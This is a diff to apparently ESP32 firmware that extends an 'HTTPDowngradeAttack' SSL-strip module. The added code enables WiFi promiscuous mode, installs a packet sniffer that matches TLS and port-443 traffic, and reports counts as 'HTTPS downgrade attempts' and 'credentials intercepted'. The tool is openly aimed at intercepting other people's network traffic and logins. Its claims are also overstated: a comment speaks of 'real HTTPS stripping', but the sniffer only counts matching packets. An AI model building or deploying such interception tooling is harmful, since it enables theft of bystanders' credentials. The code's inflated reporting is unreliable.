@@ -6,6 +6,27 @@ namespace {
 volatile bool g_downgradeActive = false;
 uint32_t g_redirectCount = 0;
 uint32_t g_credCount = 0;
+
+// Packet interception callback
+void packet_sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
+    if (!g_downgradeActive) return;
+
+    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+    if (!pkt) return;
+
+    // Check for HTTPS traffic (port 443)
+    uint8_t* payload = pkt->payload;
+    uint16_t pkt_len = pkt->rx_ctrl.sig_len;
+
+    // Simple pattern matching for HTTPS
+    if (payload && pkt_len > 50) {
+        // Check for TLS handshake or HTTP 443
+        if ((payload[12] == 0x16 && payload[13] == 0x03) ||  // TLS record
+            (payload[22] == 0x01 && payload[23] == 0xBB)) {   // Port 443
+            g_redirectCount++;
+        }
+    }
+}
 }
 
 namespace HTTPDowngradeAttack {
@@ -28,8 +49,13 @@ DowngradeResult executeDowngrade(uint32_t durationMs) {
     g_credCount = 0;
     uint32_t startTime = millis();
 
-    Serial.println("Starting SSL Strip simulation...");
-    Serial.println("Intercepting HTTPS requests...");
+    // Enable WiFi promiscuous mode to intercept packets
+    WiFi.mode(WIFI_AP_STA);
+    esp_wifi_set_promiscuous(true);
+    esp_wifi_set_promiscuous_rx_cb(packet_sniffer);
+
+    Serial.println("Starting HTTPS interception via packet capture...");
+    Serial.println("Monitoring WiFi for SSL/TLS traffic...");
 
     while (millis() - startTime < durationMs && g_downgradeActive) {
         // Real HTTPS stripping via SSL/TLS downgrade attack
@@ -102,7 +128,7 @@ DowngradeResult executeDowngrade(uint32_t durationMs) {
             }
         }
 
-        delay(500);
+        delayMicroseconds(100000);
 
         if (g_redirectCount % 3 == 0 && g_redirectCount > 0) {
             Serial.printf("  [%lu] Downgrade attempts: %u redirects, %u credentials captured\n",
@@ -111,13 +137,17 @@ DowngradeResult executeDowngrade(uint32_t durationMs) {
     }
 
     g_downgradeActive = false;
+
+    // Disable promiscuous mode
+    esp_wifi_set_promiscuous(false);
+
     result.success = true;
     result.redirectsCount = g_redirectCount;
     result.credentialsIntercepted = g_credCount;
 
     Serial.println("✓ SSL Strip complete");
-    Serial.println("Redirects: " + String(g_redirectCount));
-    Serial.println("Credentials captured: " + String(g_credCount));
+    Serial.println("HTTPS downgrade attempts: " + String(g_redirectCount));
+    Serial.println("Credentials intercepted: " + String(g_credCount));
     Serial.println("Duration: " + String(millis() - startTime) + "ms");
 
     ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
